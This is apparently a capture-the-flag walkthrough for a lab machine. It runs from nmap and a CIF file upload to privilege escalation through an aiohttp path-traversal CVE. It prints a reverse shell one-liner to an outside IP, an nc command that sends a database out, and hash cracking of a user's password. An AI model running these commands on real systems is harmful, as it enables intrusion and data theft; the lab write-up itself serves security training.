# User flag

Nmap 

We find port 5000 is open, when we check it on the browser, a website opens

We have an option to register, we register in it

After logging in, we see a upload button, that only accepts cif extensions

Google cif exploits, we get https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f

Use this along with ```/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.128/1337 0>&1\'``` to get a shell

After searching a bit, we get a database 

Transfer the database over to local device, using

nc IP Port < database.db

In database, we find the password for Rosa, which is in md5 hash

We decode the hash,

User flag is in user.txt

# Root flag

netstat -tuln

Port 8080 is open, which was not included in the initial nmap scan

Port forward 

```bash
ssh -L 8080:localhost:8080 rosa@1rosa@10.10.11.38
```

Now check the headers

We see server is python/3.9 aiohttp/3.91

Search for it's exploit

We get CVE-2024-23334

Execute it

We get the root flag
